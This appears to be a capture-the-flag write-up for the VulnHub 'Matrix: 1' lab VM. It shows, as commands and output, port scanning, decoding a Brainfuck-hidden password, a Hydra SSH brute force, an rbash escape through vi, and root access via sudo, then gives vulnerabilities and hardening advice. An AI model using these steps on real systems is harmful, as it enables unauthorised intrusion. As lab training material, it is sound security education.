@@ -1,0 +1,375 @@
+================================================================================
+Matrix: 1 CTF - Technical Solution Guide
+https://www.vulnhub.com/entry/matrix-1,259/
+================================================================================
+
+OBJECTIVE  : Get root and read /root/flag.txt
+DIFFICULTY : Intermediate
+KEYWORDS   : Port Enumeration, Base64, Brainfuck, Brute Force, rbash Escape, vi GTFOBins, Sudo
+TARGET IP  : 10.0.2.22
+
+================================================================================
+[1] RECONNAISSANCE
+================================================================================
+
+# Network scan
+nmap -sV -sC -Pn 10.0.2.22
+
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 09:23 -0400
+Nmap scan report for 10.0.2.22
+Host is up (0.00055s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
+|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
+|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
+80/tcp    open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-title: Welcome in Matrix
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
+31337/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
+|_http-title: Welcome in Matrix
+MAC Address: 08:00:27:D8:D1:DB (Oracle VirtualBox virtual NIC)
+
+# WhatWeb fingerprinting
+whatweb http://10.0.2.22
+http://10.0.2.22 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5,
+HTTPServer[SimpleHTTP/0.6 Python/2.7.14], IP[10.0.2.22], JQuery,
+Python[2.7.14], Script[text/javascript], Title[Welcome in Matrix]
+
+# Key observations:
+# - Port 22: SSH (OpenSSH 7.7)
+# - Port 80: Python SimpleHTTPServer — standard landing page, nothing useful
+# - Port 31337: Python SimpleHTTPServer — this is the interesting one ("elite" port)
+
+================================================================================
+[2] WEB ENUMERATION — PORT 31337
+================================================================================
+
+# Port 80 yields nothing interesting.
+# Investigating port 31337:
+
+curl http://10.0.2.22:31337
+
+# Reviewing the page source reveals a hidden base64-encoded string:
+ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5k
+cyxpdCBpcyBvbmx5IHlvdXJzZWxmLiAiID4gQ3lwaGVyLm1hdHJpeA==
+
+# Save and decode:
+echo "ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=" > hash.txt
+base64 -d hash.txt
+
+[Output]
+echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " > Cypher.matrix
+
+# This reveals a filename: Cypher.matrix — fetch it directly:
+curl -O http://10.0.2.22:31337/Cypher.matrix
+
+================================================================================
+[3] BRAINFUCK DECODING
+================================================================================
+
+cat Cypher.matrix
+
+# The file contains Brainfuck-encoded text — a dense pattern of +, -, <, >, [, ], . characters
+# Example of the encoded content (truncated):
++++++ ++++[ ->+++ +++++ +<]>+ +++++ ++.<+ +++[- >++++ <]>++ ++++. +++++
++.<++ +++++ ++[-> ----- ----< ]>--- -.<++ +++++ +[->+ +++++ ++<]> +++.-
+-.<++ +[->+ ++<]> ++++. <++++ ++++[ ->--- ----- <]>-- ----- ----- --.<+
+[...]
+
+# Decode using an online Brainfuck interpreter:
+# https://copy.sh/brainfuck/
+# Paste the full contents of Cypher.matrix
+
+[Decoded output]
+You can enter into matrix as guest, with password k1ll0rXX
+
+Note: Actually, I forget last two characters so I have replaced with XX
+try your luck and find correct string of password.
+
+# Credentials found (partial):
+#   Username : guest
+#   Password : k1ll0r?? (last two characters unknown)
+
+================================================================================
+[4] PASSWORD BRUTE FORCE
+================================================================================
+
+# The password ends in two unknown alphanumeric characters.
+# Generate all possible combinations (a-z, 0-9 for each position = 36^2 = 1296 combinations)
+
+# brute_force.sh generates a wordlist of all k1ll0r[a-z0-9][a-z0-9] combinations:
+chmod +x brute_force.sh
+./brute_force.sh
+[+] Done! 1296 combinations saved to wordlist.txt
+
+# Brute force SSH with Hydra:
+hydra -l guest -P wordlist.txt 10.0.2.22 ssh
+
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak
+[WARNING] Many SSH configurations limit the number of parallel tasks,
+it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1296 login tries (l:1/p:1296)
+[DATA] attacking ssh://10.0.2.22:22/
+[22][ssh] host: 10.0.2.22   login: guest   password: k1ll0r7n
+1 of 1 target successfully completed, 1 valid password found
+
+# Confirmed credentials:
+#   Username : guest
+#   Password : k1ll0r7n
+
+================================================================================
+[5] INITIAL SSH ACCESS — RESTRICTED SHELL (rbash)
+================================================================================
+
+ssh guest@10.0.2.22
+
+guest@porteus:~$ whoami
+-rbash: whoami: command not found
+
+guest@porteus:~$ ls
+-rbash: /bin/ls: restricted: cannot specify '/' in command names
+
+guest@porteus:~$ echo $PATH
+/home/guest/prog
+
+# The user is in a restricted bash (rbash) environment.
+# Discovering available commands in the restricted PATH:
+guest@porteus:~$ echo /home/guest/prog/*
+/home/guest/prog/vi
+
+# Only vi is available — this is our escape vector.
+
+================================================================================
+[6] RESTRICTED SHELL ESCAPE — vi GTFOBins
+================================================================================
+
+# Launch vi:
+guest@porteus:~$ vi
+
+# Inside vi, execute a shell escape:
+:!/bin/sh
+
+# We now have an unrestricted sh session, but PATH is still restricted:
+sh-4.4$ echo $PATH
+/home/guest/prog
+
+sh-4.4$ ls
+sh: ls: command not found
+
+# Export a full PATH and proper SHELL:
+sh-4.4$ export SHELL=/bin/bash:$SHELL
+sh-4.4$ export PATH=/usr/bin:$PATH
+
+sh-4.4$ whoami
+guest
+
+================================================================================
+[7] PRIVILEGE ESCALATION — SUDO
+================================================================================
+
+# Check sudo permissions:
+sh-4.4$ sudo -l
+
+User guest may run the following commands on porteus:
+    (ALL) ALL
+    (root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
+    (trinity) NOPASSWD: /bin/cp
+
+# Key finding: (ALL) ALL — guest can run ANY command as ANY user via sudo.
+# However, sudo su fails because /bin is not yet in PATH:
+
+sh-4.4$ sudo su
+sudo: su: command not found
+
+# Fix by adding /bin to PATH:
+sh-4.4$ export PATH=/bin:$PATH
+
+# Now escalate to root:
+sh-4.4$ sudo su
+Password: k1ll0r7n
+
+root@porteus:/home/guest# whoami
+root
+
+root@porteus:~# pwd
+/root
+
+================================================================================
+[8] ROOT FLAG
+================================================================================
+
+root@porteus:~# cat flag.txt
+
+   _,-.
+,-'  _|                  EVER REWIND OVER AND OVER AGAIN THROUGH THE
+|_,-O__`-._              INITIAL AGENT SMITH/NEO INTERROGATION SCENE
+|`-._\`.__ `_.           IN THE MATRIX AND BEAT OFF
+|`-._`-.\,-'_|  _,-'.
+     `-.|.-' | |`.-'|_     WHAT
+        |      |_|,-'_`.
+              |-._,-'  |     NO, ME NEITHER
+         jrei | |    _,'
+              '-|_,-'          IT'S JUST A HYPOTHETICAL QUESTION
+
+# ROOT FLAG CAPTURED
+
+================================================================================
+[9] ATTACK CHAIN SUMMARY
+================================================================================
+
+Nmap Port Scan → Ports 22, 80, 31337
+    |
+    v
+Port 31337 HTTP — Hidden Base64 String in Page Source
+    |
+    v
+Base64 Decode → Filename: Cypher.matrix
+    |
+    v
+curl -O http://10.0.2.22:31337/Cypher.matrix
+    |
+    v
+Brainfuck Decode → Username: guest / Password: k1ll0rXX (partial)
+    |
+    v
+Wordlist Generation (brute_force.sh) → 1296 combinations
+    |
+    v
+Hydra SSH Brute Force → guest / k1ll0r7n
+    |
+    v
+SSH Login — Restricted Shell (rbash), only vi in PATH
+    |
+    v
+vi GTFOBins Escape → :!/bin/sh → unrestricted shell
+    |
+    v
+Export PATH=/usr/bin:/bin:$PATH
+    |
+    v
+sudo -l → (ALL) ALL
+    |
+    v
+sudo su → Root Shell
+    |
+    v
+cat /root/flag.txt — SYSTEM PWNED
+
+================================================================================
+[10] VULNERABILITIES IDENTIFIED
+================================================================================
+
+1. SENSITIVE FILE EXPOSED ON OBSCURE PORT (High)
+   Detail   : Cypher.matrix hosted on port 31337 without authentication
+   Impact   : Leaks encoded credentials to any user who enumerates ports
+   Fix      : Never expose credential material on public interfaces;
+              require authentication on all HTTP services
+
+2. WEAK / BRUTE-FORCEABLE PASSWORD (High)
+   Detail   : Guest password k1ll0r7n falls within a 1296-entry wordlist
+   Impact   : Hydra recovers it in seconds
+   Fix      : Enforce strong password policy; disable SSH password auth;
+              use key-based authentication only
+
+3. RESTRICTED SHELL BYPASS VIA vi (Medium)
+   Detail   : rbash with only vi in PATH; vi permits :!/bin/sh shell escape
+   Impact   : Complete rbash bypass in one command
+   Fix      : Do not rely on rbash for security; avoid placing GTFOBins-
+              exploitable binaries in restricted PATH; use proper
+              containerization or chroot instead
+
+4. SUDO MISCONFIGURATION — (ALL) ALL (Critical)
+   Detail   : guest has unrestricted sudo access to all commands
+   Impact   : Trivial privilege escalation to root
+   Fix      : Apply principle of least privilege; never grant (ALL) ALL
+              without strong justification; audit /etc/sudoers regularly
+
+================================================================================
+[11] SECURITY RECOMMENDATIONS
+================================================================================
+
+1. SSH Hardening
+   - Disable password authentication: PasswordAuthentication no
+   - Enforce SSH key-based authentication only
+   - Deploy fail2ban to block brute-force attempts
+   - Consider port-knocking or VPN access for SSH
+
+2. Credential & File Exposure
+   - Never host files containing credentials (even encoded) on unauthenticated
+     HTTP endpoints
+   - Treat all encoding (base64, brainfuck, ROT13) as security theater, not
+     actual security — obfuscation is not encryption
+
+3. Restricted Shell Design
+   - rbash alone is insufficient for security boundaries
+   - Avoid placing GTFOBins-listed binaries (vi, less, man, awk, etc.) in
+     restricted PATH — see https://gtfobins.github.io/
+   - Use real sandboxing: namespaces, containers, or chroot with minimal toolsets
+
+4. Sudo Policy
+   - Audit all sudoers entries: visudo, getent passwd, sudo -l per user
+   - Never assign (ALL) ALL to unprivileged accounts
+   - Require re-authentication (remove NOPASSWD where not strictly needed)
+   - Use specific command paths with fixed arguments
+
+================================================================================
+[12] TOOLS USED
+================================================================================
+
+Reconnaissance:
+  nmap       - Network and service scanning
+  whatweb    - Web technology fingerprinting
+
+Enumeration:
+  curl       - HTTP file retrieval and source inspection
+
+Decoding:
+  base64     - Decoding the page source hint
+  copy.sh/brainfuck - Online Brainfuck interpreter (https://copy.sh/brainfuck/)
+
+Password Attacks:
+  bash       - Custom wordlist generation (brute_force.sh)
+  hydra      - SSH brute force
+
+Exploitation:
+  vi         - GTFOBins shell escape (:!/bin/sh)
+  sudo       - Privilege escalation (sudo su)
+
+References:
+  GTFOBins   - https://gtfobins.github.io/gtfobins/vi/
+  Brainfuck  - https://copy.sh/brainfuck/
+
+================================================================================
+[13] REFERENCES
+================================================================================
+
+VulnHub:
+  Matrix: 1 VM : https://www.vulnhub.com/entry/matrix-1,259/
+
+GTFOBins vi:
+  https://gtfobins.github.io/gtfobins/vi/
+
+Brainfuck Decoder:
+  https://copy.sh/brainfuck/
+
+Hydra:
+  https://github.com/vanhauser-thc/thc-hydra
+
+================================================================================
+[14] DISCLAIMER
+================================================================================
+
+This writeup is for educational and training purposes only. All techniques
+demonstrated should only be used on systems you own or have explicit written
+permission to test. Unauthorized access to computer systems is illegal and
+may result in criminal prosecution.
+
+The author and VulnHub are not responsible for any misuse of the information
+provided in this writeup. This content is intended to help security
+professionals learn and practice ethical hacking in controlled environments.
+
+================================================================================
